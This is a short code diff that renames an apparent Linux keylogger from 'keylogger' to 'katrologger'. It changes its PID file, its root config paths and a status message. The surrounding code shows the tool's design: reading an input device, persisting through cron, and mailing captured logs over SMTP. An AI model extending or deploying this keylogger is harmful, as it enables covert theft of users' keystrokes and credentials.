@@ -18,13 +18,13 @@
 #include "usage.h"
 #include "curl_smtp.h"
 
-#define PID_FILE "/var/run/keylogger.pid"
+#define PID_FILE "/var/run/katrologger.pid"
 #define CRON_SMTP "/var/spool/cron/cronjob"
 #define CRON_SMTP_RUN "/var/spool/cron/crontabs/cronjob"
-#define PATH_CONF "/root/.config/keylogger/path.conf"
-#define TIME_CONF "/root/.config/keylogger/time.conf"
-#define SIZE_CONF "/root/.config/keylogger/size.conf"
-#define SMTP_CONF "/root/.config/keylogger/smtp.conf"
+#define PATH_CONF "/root/.config/katrologger/path.conf"
+#define TIME_CONF "/root/.config/katrologger/time.conf"
+#define SIZE_CONF "/root/.config/katrologger/size.conf"
+#define SMTP_CONF "/root/.config/katrologger/smtp.conf"
 #define SMTP_LOGS "/var/log/smtp.log"
 
 const char *path_conf = PATH_CONF;
@@ -36,7 +36,7 @@ const char *cron_file = CRON_SMTP;
 const char *smtp_file = CRON_SMTP_RUN;
 const char *smtp_logs = SMTP_LOGS;
 
-const char *dir_config = "/root/.config/keylogger";
+const char *dir_config = "/root/.config/katrologger";
 const char *dev_input;
 
 FILE *get_pid;
@@ -176,7 +176,7 @@ check_status();
 if (flag_running == 1) {
   system("clear");
     printf("[x] Keylogger is already running\n");
-    printf("Use: keylogger --status\n");
+    printf("Use: katrologger --status\n");
   exit(1);
 }
 
